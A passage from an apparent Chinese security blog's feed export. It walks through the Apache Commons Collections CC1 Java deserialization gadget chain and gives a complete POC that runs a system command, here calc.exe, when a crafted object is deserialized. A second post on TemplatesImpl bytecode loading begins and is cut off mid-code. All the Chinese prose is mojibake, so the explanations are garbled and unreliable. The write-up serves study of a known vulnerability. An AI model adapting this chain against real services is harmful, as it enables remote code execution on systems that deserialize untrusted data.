class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h3><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203031725553.png" alt="QQæˆªå›¾20220302162610"></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203031725101.png" alt="QQæˆªå›¾20220302162616"></p><p>è¿™é‡Œå°±æ¯”è¾ƒæœ‰æ„æ€äº†ã€‚ç›´æ¥åˆ©ç”¨åå°„äº†ã€‚è€Œä¸”ä¼ å…¥çš„å‚æ•°æ˜¯å¯ä»¥æ§åˆ¶çš„ã€‚</p><h3 id="åˆ©ç”¨invokerTransformerå¼¹ä¸ªè®¡ç®—å™¨"><a href="#åˆ©ç”¨invokerTransformerå¼¹ä¸ªè®¡ç®—å™¨" class="headerlink" title="åˆ©ç”¨invokerTransformerå¼¹ä¸ªè®¡ç®—å™¨"></a>åˆ©ç”¨invokerTransformerå¼¹ä¸ªè®¡ç®—å™¨</h3><h4 id="å¤ä¹ åå°„"><a href="#å¤ä¹ åå°„" class="headerlink" title="å¤ä¹ åå°„"></a>å¤ä¹ åå°„</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">aClass</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>);<br><span class="hljs-type">Constructor</span> <span class="hljs-variable">declaredConstructor</span> <span class="hljs-operator">=</span> aClass.getDeclaredConstructor();<br>declaredConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>aClass.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class).invoke(declaredConstructor.newInstance(),<span class="hljs-string">&quot;calc.exe&quot;</span>);<br></code></pre></td></tr></table></figure><h4 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Runtime</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br>       <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;).transform(runtime);<br></code></pre></td></tr></table></figure><p>å¦‚æœçœ‹ä¸æ‡‚è¿™ä¸ªä¸ºä»€ä¹ˆè¿™ä¹ˆæ„é€ å»ºè®®å¤šçœ‹ï¼Œä¸Šé¢<code>invokerTransformer</code>çš„å®ç°æ–¹æ³•ã€‚æˆ–è€…å›å»å¤ä¹ åå°„ã€‚</p><h3 id="TransformedMap"><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a>TransformedMap</h3><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203031725975.png" alt="QQæˆªå›¾20220302165423"></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203021648812.png" alt="QQæˆªå›¾20220302164819"></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203031725010.png" alt="QQæˆªå›¾20220302164829"></p><p>å¾ˆæœ‰æ„æ€ï¼Œå³ä½¿æ˜¯è¿™é‡Œç”¨protectä¿æŠ¤äº†æ­¤æ–¹æ³•ï¼Œä½†æ˜¯è¿˜ç»™äº†å¦å¤–çš„å®ç°ä¼ å…¥å‚æ•°æ–¹æ³•ã€‚è¿™é‡Œä¸å°±æ˜¯ä¼ å…¥å€¼ï¼Œç„¶åå°±ä¼šç»§ç»­è°ƒç”¨<code>invokerTransformer</code>ã€‚</p><p>ç›¸å½“äºä¼ å…¥ä¸€ä¸ª<code>valueTransformer</code>ï¼Œè€Œè¿™ä¸ªå€¼æˆ‘ä»¬å¯ä»¥æ§åˆ¶ï¼Œåˆšå¥½å¯ä»¥ä¼ å…¥<strong>invokerTransformer</strong></p><p>æ„é€ ï¼</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Runtime</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br>  <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">exec</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;);<br>  HashMap&lt;Object, Object&gt; objectObjectHashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>  TransformedMap.decorate(objectObjectHashMap,<span class="hljs-literal">null</span>,exec);<br></code></pre></td></tr></table></figure><p>ä½†æ˜¯è¿™é‡Œå´æ²¡æœ‰è§¦å‘<code>checkSetValue</code>æ–¹æ³•ã€‚</p><h3 id="checkSetValue"><a href="#checkSetValue" class="headerlink" title="checkSetValue"></a>checkSetValue</h3><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203021703497.png" alt="QQæˆªå›¾20220302170322"></p><p>çœŸçš„å·§ï¼Œåªæœ‰ä¸€å¤„ä½¿ç”¨äº†å®ƒã€‚å»çœ‹çœ‹ã€‚å…ˆå»è®­ç»ƒäº†ã€‚ï¼ˆä¸»è¦æ˜¯æ†‹ä¸ä½å°¿äº†ã€‚è°ˆäº†æ‹çˆ±ä¹Ÿè¦ç»å¸¸é”»ç‚¼ï¼Œæ°´äº†é˜Ÿé‡Œå¥½å‡ æ¬¡è®­ç»ƒäº†ã€‚å“ˆå“ˆå“ˆ~~ï¼‰<br>22.13æ‰èµ¶åˆ°å®éªŒå®¤ã€‚<br>ç»§ç»­å†™å§ã€‚<br>ç»§ç»­è·Ÿè¿›ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203031725179.png" alt="QQæˆªå›¾20220302221426"></p><p>å¾ˆæ˜¾ç„¶è¿™é‡Œè¦æ‰¾<code>setValue</code>ã€‚è¿™é‡Œæˆ‘ä»¬å¯ä»¥æ³¨æ„åˆ°ï¼Œè¿™ä¸¤ç±»éƒ½ç»§æ‰¿äº†<code>AbstractInputCheckedMapDecorator</code></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203031725383.png" alt="QQæˆªå›¾20220302221854"></p><p>ä¹Ÿå°±æ˜¯è¯´åœ¨ä½¿ç”¨entryéå†èµ‹å€¼è¢«ä¿®é¥°è¿‡çš„ç±»èµ‹å€¼æ—¶ï¼Œä¼šè°ƒç”¨è¿™ä¸ªæ–¹æ³•ã€‚è€Œè¿™ä¸ªçˆ¶ç±»åˆšå¥½åˆæ˜¯è¿™é‡Œçš„<code>MapEntry</code>çš„ç±»ã€‚çœŸçš„å¤ªå·§äº†ã€‚</p><h4 id="Demo-1"><a href="#Demo-1" class="headerlink" title="Demo"></a>Demo</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Runtime</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br>      <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">exec</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;);<br>      HashMap&lt;Object, Object&gt; objectObjectHashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>      objectObjectHashMap.put(<span class="hljs-string">&quot;key&quot;</span>, <span class="hljs-string">&quot;value&quot;</span>);<br>      Map&lt;Object,Object&gt; decorate = TransformedMap.decorate(objectObjectHashMap, <span class="hljs-literal">null</span>, exec);<br>      <span class="hljs-keyword">for</span>(Map.Entry entry:decorate.entrySet())&#123;<br>          entry.setValue(runtime);<br>      &#125;<br><br></code></pre></td></tr></table></figure><h3 id="AnnotationInvocationHandler"><a href="#AnnotationInvocationHandler" class="headerlink" title="AnnotationInvocationHandler"></a>AnnotationInvocationHandler</h3><p>è®°å¾—ä¹‹å‰åŠ å…¥çš„åŒ…å—ï¼Ÿè¿™é‡Œå…¶å®å°±å¾ˆå‡‘å·§ã€‚å¾ˆæœ‰æ„æ€ã€‚åˆšå¥½<code>AnnotationInvocationHandler</code>é‡Œé¢çš„<code>readObjetc</code>å°½ç„¶è°ƒç”¨äº†<code>setValue</code></p><p>è€Œä¸”è¿™ä¸ª<code>readObject</code>åˆšå¥½å®Œæˆäº†éå†æ•°ç»„çš„åŠŸèƒ½ã€‚è¿˜å¯ä»¥ååºåˆ—ã€‚è¾¾åˆ°æ¼æ´çš„æ•ˆæœã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203031725232.png" alt="QQæˆªå›¾20220302223706"></p><p>ç„¶åçœ‹çœ‹å®ƒçš„æ„é€ å‡½æ•°ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203022239939.png" alt="QQæˆªå›¾20220302223929"></p><p>è¿™é‡Œå€¼å¾—æ³¨æ„<strong>ä½œç”¨åŸŸ</strong>ï¼Œä¹‹å‰æ–‡ç« æœ‰è®²ã€‚<br><strong>Annotation</strong>ï¼šæ³¨è§£ç±»ã€‚<br><strong>memberValues</strong>ï¼šå¯æ§å€¼ã€‚ä¼ å…¥<code>decorate</code>ã€‚<br>ç„¶åæˆ‘ä»¬è§£å†³ä¸€ä¸‹<code>AnnotationInvocationHandler</code>ä¸­çš„é™åˆ¶æ¡ä»¶ã€‚<br><strong>ä¸¤ä¸ª<code>if</code>å’Œä¸å¯æ§åˆ¶çš„ä¼ å…¥<code>setValue</code>çš„å€¼</strong></p><h4 id="if"><a href="#if" class="headerlink" title="if"></a>if</h4><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203031629397.png" alt="QQæˆªå›¾20220303162858"></p><p><strong>ç¬¬ä¸€ä¸ªif</strong>ï¼šè¿™é‡Œå°±æ˜¯è¦æ‰¾ä¸€ä¸ªæ³¨è§£ç±»ï¼Œå¹¶ä¸”æœ‰å®ç°æ–¹æ³•ã€‚</p><p>æ³¨è§£ç±»ä¸­ä¸¤ä¸ªæ³¨è§£ï¼Œéƒ½å®ç°äº†<strong>valueï¼ˆï¼‰</strong>æ–¹æ³•ã€‚<br><strong>@Target</strong>å’Œ**@Retention**</p><p><strong>ç¬¬äºŒä¸ªifï¼š</strong>åˆ¤æ–­ä¸¤ä¸ªç±»å‹æ˜¯å¦èƒ½å¤Ÿå¼ºè½¬</p><h4 id="ä¸å¯æ§åˆ¶çš„ä¼ å…¥setValueçš„å€¼"><a href="#ä¸å¯æ§åˆ¶çš„ä¼ å…¥setValueçš„å€¼" class="headerlink" title="ä¸å¯æ§åˆ¶çš„ä¼ å…¥setValueçš„å€¼"></a>ä¸å¯æ§åˆ¶çš„ä¼ å…¥<code>setValue</code>çš„å€¼</h4><p>åˆ©ç”¨<strong>ConstantTransformer</strong>ã€‚ç›´æ¥ </p><h3 id="è§£å†³Runtimeç±»ä¸å¯ä»¥åºåˆ—åŒ–"><a href="#è§£å†³Runtimeç±»ä¸å¯ä»¥åºåˆ—åŒ–" class="headerlink" title="è§£å†³Runtimeç±»ä¸å¯ä»¥åºåˆ—åŒ–"></a>è§£å†³Runtimeç±»ä¸å¯ä»¥åºåˆ—åŒ–</h3><p>å·§çš„æ˜¯ï¼ŒRuntimeçš„classæ˜¯å¯ä»¥åºåˆ—åŒ–çš„ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">runtimeClass</span> <span class="hljs-operator">=</span> Runtime.class;<br><span class="hljs-type">Method</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> runtimeClass.getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-literal">null</span>);<br><span class="hljs-type">Object</span> <span class="hljs-variable">invoke</span> <span class="hljs-operator">=</span> runtime.invoke(<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br><span class="hljs-type">Method</span> <span class="hljs-variable">exec</span> <span class="hljs-operator">=</span> runtimeClass.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class);<br>exec.invoke(invoke,<span class="hljs-string">&quot;calc.exe&quot;</span>);<br></code></pre></td></tr></table></figure><p><code>**Object invoke = runtime.invoke(null, null);**</code><br>ç›¸å½“äºæ˜¯è·å–åˆ°äº†Runtimeè¿™ä¸ªå¯¹è±¡ã€‚</p><p>ç„¶åå°±å»æ„é€ åˆ°<strong>invokerTransformer</strong>ä¸­å»ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Object</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;).transform(Runtime.class);<br>       <span class="hljs-type">Object</span> <span class="hljs-variable">invoke</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>&#125;).transform(runtime);<br>       <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;).transform(invoke);<br></code></pre></td></tr></table></figure><h3 id="åˆ©ç”¨ChainedTransformer"><a href="#åˆ©ç”¨ChainedTransformer" class="headerlink" title="åˆ©ç”¨ChainedTransformer"></a>åˆ©ç”¨ChainedTransformer</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">InvokerTransformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;)<br>       &#125;;<br>       <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>       chainedTransformer.transform(Runtime.class);<br></code></pre></td></tr></table></figure><h2 id="å®Œæ•´POC"><a href="#å®Œæ•´POC" class="headerlink" title="å®Œæ•´POC"></a>å®Œæ•´POC</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Retention;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Cc1Finsh</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException &#123;<br><br>       Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>               <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-literal">null</span>&#125;),<br>               <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;)<br>       &#125;;<br><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        HashMap&lt;Object, Object&gt; objectObjectHashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        objectObjectHashMap.put(<span class="hljs-string">&quot;value&quot;</span>,<span class="hljs-string">&quot;123&quot;</span>);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">decorate</span> <span class="hljs-operator">=</span> TransformedMap.decorate(objectObjectHashMap, <span class="hljs-literal">null</span>, chainedTransformer);<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">aClass</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> aClass.getDeclaredConstructor(Class.class, Map.class);<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> constructor.newInstance(Retention.class, decorate);<br>        serialize(o);<br>        unserialize(<span class="hljs-string">&quot;xsw6a.bin&quot;</span>);<br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;xsw6a.bin&quot;</span>));<br>        objectOutputStream.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String FileName)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(FileName));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> objectInputStream.readObject();<br>        <span class="hljs-keyword">return</span> o;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>JavaWeb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>TemplatesImplåŠ è½½å­—èŠ‚ç </title>
    <link href="/2022/03/01/TemplatesImpl%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/"/>
    <url>/2022/03/01/TemplatesImpl%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/</url>
    
    <content type="html"><![CDATA[<h1 id="TemplatesImplåŠ è½½å­—èŠ‚ç "><a href="#TemplatesImplåŠ è½½å­—èŠ‚ç " class="headerlink" title="TemplatesImplåŠ è½½å­—èŠ‚ç "></a>TemplatesImplåŠ è½½å­—èŠ‚ç </h1><p>ä¸Šä¸€ç¯‡è¯´åˆ°åŠ è½½å­—èŠ‚ç ã€‚ç”¨åˆ°äº†<code>url</code>çš„<code>loadclass</code>å’Œ<code>classloader</code>çš„<code>defineclass</code>ä½†æ˜¯å‘¢è¢«å…¶ä½œç”¨åŸŸé™åˆ¶ä½äº†ã€‚<br>é‚£æˆ‘å°±ä¼šæƒ³åˆ°æ€ä¹ˆå»æ‰¾å…¶ä»–ç±»çœ‹çœ‹ä¼šä¸ä¼šåˆé—´æ¥è°ƒç”¨<code>defineclass</code>çš„ï¼ˆå½“ç„¶è¿™æ˜¯åœ¨æˆ‘å¤ä¹ çš„æ—¶å€™æ‰ä¼šæƒ³åˆ°çš„+åˆ†æäº†è®¸å¤šçš„æ¼æ´ï¼‰ï¼Œè¿™æ˜¯ä»¥åå¿…é¡»å…»æˆçš„ä¹ æƒ¯ï¼ˆé—´æ¥ï¼ï¼‰</p><h2 id="TemplatesImple"><a href="#TemplatesImple" class="headerlink" title="TemplatesImple"></a>TemplatesImple</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203012025891.png" alt="QQæˆªå›¾20220301202453"></p><p>æ¸…æ™°å¯è§è¿™é‡Œçš„<code>defineClass</code>æ²¡æœ‰äº†<code>protect</code>ï¼Œæ²¡æœ‰ä½œç”¨åŸŸï¼Ÿä¸ï¼Œå®ƒè¿™é‡Œçš„ä¸å†™ï¼Œå°±é»˜è®¤ä»£è¡¨äº†<code>default</code>ç±»ï¼Œ<strong>è¿™æ˜¯å¯ä»¥è¢«å¤–éƒ¨è°ƒç”¨çš„</strong>ã€‚</p><p>å›æº¯ä¸€ä¸‹ã€‚å“ªé‡Œè°ƒç”¨äº†<code>defineClass</code>çš„<code>TransletClassLoader</code>æ–¹æ³•ã€‚å‘ç°äº†åœ¨<code>TemplatesImpl</code>ç±»ä¸­åªæœ‰ <code>defineTransletClasse</code>è°ƒç”¨äº†ã€‚äºæ˜¯ç»§ç»­å›æº¯ï¼ŒæŸ¥çœ‹å“ªé‡Œè°ƒç”¨äº†<code>defineTransletClasse</code>ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203012250229.png" alt="QQæˆªå›¾20220301203806"></p><p>æ˜¾è€Œæ˜“è§çš„ä¸‰ç§ã€‚</p><p>ä¸€ä¸ªä¸€ä¸ªæ¥çœ‹ã€‚</p><h4 id="åˆ©ç”¨é“¾1"><a href="#åˆ©ç”¨é“¾1" class="headerlink" title="åˆ©ç”¨é“¾1"></a>åˆ©ç”¨é“¾1</h4><figure class="highlight leaf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs leaf">TemplatesImpl<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">newTransformer</span><span class="hljs-params">()</span></span> -&gt; TemplatesImpl<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">getTransletInstance</span><span class="hljs-params">()</span></span> -&gt; TemplatesImpl<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">defineTransletClasses</span><span class="hljs-params">()</span></span>-&gt;TemplatesImpl<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">defineTransletClasses</span><span class="hljs-params">()</span></span> -&gt; TransletClassLoader<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">defineClass</span><span class="hljs-params">()</span></span> <br></code></pre></td></tr></table></figure><h4 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> 